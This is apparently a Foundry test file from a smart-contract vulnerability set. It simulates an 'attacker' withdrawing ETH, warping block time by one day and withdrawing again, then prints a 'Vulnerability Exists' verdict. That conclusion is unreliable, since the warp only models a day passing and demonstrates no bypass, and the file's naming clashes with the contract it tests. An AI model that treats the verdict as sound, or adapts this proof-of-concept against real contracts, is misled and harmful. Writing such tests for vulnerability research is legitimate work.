// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/reentrancy_cross_function.sol";

contract TimestampDependenceTest is Test {
    Reentrancy_cross_function public target;
    address attacker = makeAddr("attacker");
    
    function setUp() public {
        // Deploy contract and fund attacker with ETH
        target = new Reentrancy_cross_function();
        vm.deal(attacker, 2 ether);
        
        // Set initial timestamp to 1 day (86400 seconds)
        vm.warp(86400);
    }

    function testTimestampManipulationBypass() public {
        // Attacker deposits ETH
        vm.prank(attacker);
        target.deposit{value: 1 ether}();

        console.log("--- BEFORE-Trigger First Withdrawal ---");
        (uint256 attackerBalanceBefore1, uint256 totalWithBefore1, uint256 lastWithdrawTimeBefore1) = captureState();
        logState("Before first withdrawal", attackerBalanceBefore1, totalWithBefore1, lastWithdrawTimeBefore1);

        // First withdrawal (day 1)
        console.log("--- Triggering First withdrawBalance ---");
        vm.prank(attacker);
        target.withdrawBalance();
        assertEq(target.getBalance(attacker), 0, "Balance not reset");

        console.log("--- AFTER-Trigger First Withdrawal ---");
        (uint256 attackerBalanceAfter1, uint256 totalWithAfter1, uint256 lastWithdrawTimeAfter1) = captureState();
        logState("After first withdrawal", attackerBalanceAfter1, totalWithAfter1, lastWithdrawTimeAfter1);

        // Manipulate timestamp to next day (day 2)
        vm.warp(block.timestamp + 86400);
        
        // Attacker deposits again
        vm.prank(attacker);
        target.deposit{value: 1 ether}();
        assertEq(target.getBalance(attacker), 1 ether, "Deposit failed");

        console.log("--- BEFORE-Trigger Second Withdrawal ---");
        (uint256 attackerBalanceBefore2, uint256 totalWithBefore2, uint256 lastWithdrawTimeBefore2) = captureState();
        logState("Before second withdrawal", attackerBalanceBefore2, totalWithBefore2, lastWithdrawTimeBefore2);

        // Second withdrawal bypassing real-time wait
        console.log("--- Triggering Second withdrawBalance ---");
        vm.prank(attacker);
        target.withdrawBalance();
        assertEq(target.getBalance(attacker), 0, "Second withdrawal failed");

        console.log("--- AFTER-Trigger Second Withdrawal ---");
        (uint256 attackerBalanceAfter2, uint256 totalWithAfter2, uint256 lastWithdrawTimeAfter2) = captureState();
        logState("After second withdrawal", attackerBalanceAfter2, totalWithAfter2, lastWithdrawTimeAfter2);

        // Check exploitation conditions
        bool timestampManipulated = (lastWithdrawTimeAfter2 - lastWithdrawTimeBefore1) == 86400;
        bool doubleWithdrawn = totalWithAfter2 == 2 ether;
        bool passiveBypass = timestampManipulated && doubleWithdrawn;
        
        // Final verdict
        if(passiveBypass) {
            console.log("Vulnerability Exists: Attacker bypassed time lock restrictions through timestamp manipulation");
        } else {
            console.log("Vulnerability not Exist: Required state changes did not occur");
        }
    }

    // Helper function to capture stite
    function captureState() internal view returns (uint256, uint256, uint256) {
        return (
            target.getBalance(attacker),
            target.totalWithdrawals(),
            target.lastWithdrawTime(attacker)
        );
    }

    // Helper function to logsate
    function logState(string memory prefix, uint256 balance, uint256 totalWith, uint256 lastWithdrawT) internal {
        console.log(prefix, ":");
        console.log("  Attacker Balance:", balance);
        console.log("  Total Withdrawals:", totalWith);
        console.log("  Last Withdraw Time:", lastWithdrawT);
        console.log("---------------------------------");
    }
}